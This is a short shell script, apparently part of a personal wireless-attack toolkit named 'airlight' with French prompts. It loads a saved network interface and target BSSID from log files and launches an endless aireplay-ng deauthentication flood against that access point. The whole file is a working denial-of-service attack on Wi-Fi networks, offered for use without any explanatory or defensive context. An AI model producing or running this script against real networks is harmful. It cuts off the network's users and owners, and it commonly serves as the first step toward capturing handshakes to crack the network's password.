#!/bin/sh

sudo echo ""
interface=$(cat /home/$USER/scripts/airlight/logs/interface.txt)
bssid=$(cat /home/$USER/scripts/airlight/logs/bssid.txt)
read -p "Appuyez sur une touche pour continuer." xd
gnome-terminal -e "airlight"
echo "\033[33m$ aireplay-ng -0 0 -a $bssid --ignore-negative-one $interface\033[0m"
sudo aireplay-ng -0 0 -a $bssid --ignore-negative-one $interface



